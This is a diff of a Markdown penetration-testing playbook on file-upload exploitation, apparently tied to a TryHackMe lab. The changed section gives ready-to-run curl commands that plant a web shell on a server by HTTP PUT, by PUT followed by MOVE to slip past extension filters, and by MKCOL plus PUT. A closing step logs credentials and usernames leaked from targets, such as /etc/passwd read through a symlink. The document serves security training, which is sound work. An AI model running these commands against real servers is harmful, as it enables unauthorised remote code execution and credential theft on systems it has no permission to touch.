@@ -1,7 +1,7 @@
 
 > **STATUS: AUDITED** — first-principles + primary-source derivation (OWASP WSTG-BUSL-09 "Test Upload of Malicious Files", PortSwigger "File upload vulnerabilities", HackTricks "File Upload", PayloadsAllTheThings "Upload Insecure Files"); curl `-F` wire format, `${VAR:+-b "$VAR"}` conditional cookie handling, `HIDDEN_FLAGS[@]` array expansion, printf `%%` escape for ASP/JSP payloads, and GIF87a magic-byte survival through `file(1)` all sandbox-verified. Live-validation partial — THM:Guided Pentest: Web (RecruitX) exercised pre-flight, Section 2a alt-extension bypass, Verify RCE, and Reverse shell upgrade end-to-end (RCE via `.phtml`, foothold, flag). Sections 2b/2c/2d/3/4/5/6/7 remain structural audit only, unvalidated pending future targets hitting their branches.
 
-Upload a file the app didn't want you to upload, then reach and execute it. Two orthogonal problems: **delivery** (get bytes past validation) and **execution** (get those bytes triggered as code). Both must succeed for RCE; non-RCE payloads (SVG XSS, filename injection) need only delivery. Entry from [[Web Attack Checksheet]] sub-block 1.10 (unauth) and [[Authenticated Walk]] sub-blocks 4 & 5 (authed).
+Upload a file the app didn't want you to upload, then reach and execute it. Two orthogonal problems: **delivery** (get bytes past validation) and **execution** (get those bytes triggered as code). Both must succeed for RCE; non-RCE payloads (SVG XSS, filename injection) need only delivery.
 
 ⚠️ Delivery ≠ execution. A `200 OK` upload response does not prove RCE. Every SUCCESS branch in Sections 1-5 routes through [[#Verify RCE]] before earning "foothold".
 
@@ -417,32 +417,44 @@ REJECTED both 4a/4b → Section 5.
 
 ---
 
-## 5. PUT direct upload
+## 5. Write via HTTP method (PUT / MKCOL / MOVE)
 
-HTTP `PUT` writes the request body to a server path. Rare but occasional on WebDAV-enabled endpoints or misconfigured static-file servers.
+Entered from [[Web Attack Checksheet]] Step 4 with `<put_dir>` already confirmed writable. Step 4 did the discovery; this section weaponises it. `<put_dir>` = the Step 4 `WRITE_CONFIRMED` directory (trailing slash).
 
-Probe common upload / static-file directories for PUT support:
+### 5a. PUT direct
 
 ```bash
-for probe_dir in / /uploads/ /files/ /media/ /attachments/ /images/ /static/ /storage/ /webdav/ /dav/; do
-  allow=$(curl -sI -X OPTIONS "${GET_FLAGS[@]}" "http://$HOST:$PORT$probe_dir" | grep -i '^Allow:')
-  echo "$probe_dir -> ${allow:-(no Allow header)}"
-done
+curl -isX PUT "${POST_FLAGS[@]}" --data-binary @/tmp/shell.$SHELL_EXT "http://$HOST:$PORT<put_dir>shell.$SHELL_EXT"
 ```
 
-Route per output:
+201 / 200 / 204 → [[#Verify RCE]], retrieval URL `http://$HOST:$PORT<put_dir>shell.$SHELL_EXT`.
+PUT rejected on the executable extension (403 / 415 on `.$SHELL_EXT`, but `.txt` would take) → 5b.
+MKCOL was the confirmed verb, not PUT → 5c.
 
-- Any line contains `Allow:` header including `PUT` → attempt direct upload to that dir:
+### 5b. PUT + MOVE (extension-filter bypass)
 
-    ```bash
-	curl -isX PUT "${POST_FLAGS[@]}" \
-      --data-binary @/tmp/shell.$SHELL_EXT \
-      "http://$HOST:$PORT<put_dir>shell.$SHELL_EXT"
-    ```
+Filter rejects the executable extension on PUT but not on MOVE. PUT a permitted extension, MOVE to the executable one:
 
-    Substitute `<put_dir>` = the directory where OPTIONS returned `Allow: PUT`. 201 / 200 / 204 → uploaded → [[#Verify RCE]] with retrieval URL `http://$HOST:$PORT<put_dir>shell.$SHELL_EXT`.
+```bash
+curl -isX PUT "${POST_FLAGS[@]}" --data-binary @/tmp/shell.$SHELL_EXT "http://$HOST:$PORT<put_dir>shell.txt"
+curl -isX MOVE "${POST_FLAGS[@]}" -H "Destination: http://$HOST:$PORT<put_dir>shell.$SHELL_EXT" "http://$HOST:$PORT<put_dir>shell.txt"
+```
 
-- No `Allow:` header contains `PUT`, all rows show `(no Allow header)` or 405 → PUT not permitted → Section 6.
+MOVE 201 / 204 → [[#Verify RCE]], retrieval URL `http://$HOST:$PORT<put_dir>shell.$SHELL_EXT`.
+MOVE rejected → Section 6.
+
+### 5c. MKCOL + PUT (directory creation)
+
+Step 4 confirmed MKCOL, not PUT, on `<put_dir>`. Create a child dir, PUT the shell into it:
+
+```bash
+curl -isX MKCOL "${POST_FLAGS[@]}" "http://$HOST:$PORT<put_dir>wac/"
+curl -isX PUT "${POST_FLAGS[@]}" --data-binary @/tmp/shell.$SHELL_EXT "http://$HOST:$PORT<put_dir>wac/shell.$SHELL_EXT"
+```
+
+PUT 201 / 200 / 204 → [[#Verify RCE]], retrieval URL `http://$HOST:$PORT<put_dir>wac/shell.$SHELL_EXT`.
+PUT into the new dir still rejected on extension → 5b against `<put_dir>wac/`.
+All rejected → Section 6.
 
 ---
 
@@ -716,8 +728,8 @@ Non-RCE hit (Section 6 branches):
 
 Any credentials / usernames leaked during chain (e.g., `/etc/passwd` via symlink → usernames):
 
-- Append emails / usernames → `users_<host>.txt` per [[Web Attack Checksheet#Username accumulator convention]].
-- Append credentials → `creds_<host>.txt` per [[Web Attack Checksheet#Credential accumulator convention]].
+- Append emails / usernames → `users_<host>.txt` per [[Web Attack Checksheet#`users_<host>.txt`]].
+- Append credentials → `creds_<host>.txt` per [[Web Attack Checksheet#`creds_<host>.txt`]].
 
 ---
 
